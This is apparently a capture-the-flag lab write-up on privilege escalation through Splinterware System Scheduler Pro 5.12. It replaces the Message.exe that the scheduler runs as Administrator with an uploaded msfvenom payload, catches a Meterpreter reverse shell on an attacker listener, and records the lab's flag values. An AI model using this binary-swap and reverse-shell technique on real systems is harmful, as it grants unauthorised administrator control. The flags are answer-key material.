## Splinterware System Scheduler Pro 5.12 - Privilege Escalation

* SystemScheduler located in `c:\Program Files (x86)\SystemScheduler`
* Checking logs in - `C:\Program Files (x86)\SystemScheduler\Events`
* `type 20198415519.INI_LOG.txt`

```
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
```

* every 30 seconds, a process called `Message.exe` runs
* actual `Message.exe` executable resides in `C:\PROGRA~2\SYSTEM~1\Message.exe`
* the exploit requires us to replace this file with our own malicious exe
* we can't delete this file but we can rename it to `Message.exe.bak`
* `move Message.exe Message.exe.bak`

## Meterpreter

* we can upload a second file generated in msfvenom with the same options as before

```
meterpreter > upload exploit2.exe
[*] uploading  : exploit2.exe -> exploit2.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): exploit2.exe -> exploit2.exe
[*] uploaded   : exploit2.exe -> exploit2.exe
```

* `meterpreter > mv exploit2.exe "C:\\PROGRA~2\\SYSTEM~1\\Message.exe"`
* now we wait 30 seconds...
```
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.37.213:9001 
[*] Sending stage (176195 bytes) to 10.10.185.149
[*] Meterpreter session 3 opened (10.10.37.213:9001 -> 10.10.185.149:49325) at 2022-04-18 22:26:00 +0100
```
user.txt - `759bd8af507517bcfaede78a21a73e39`
root.txt - `7e13d97f05f7ceb9881a3eb3d78d3e72`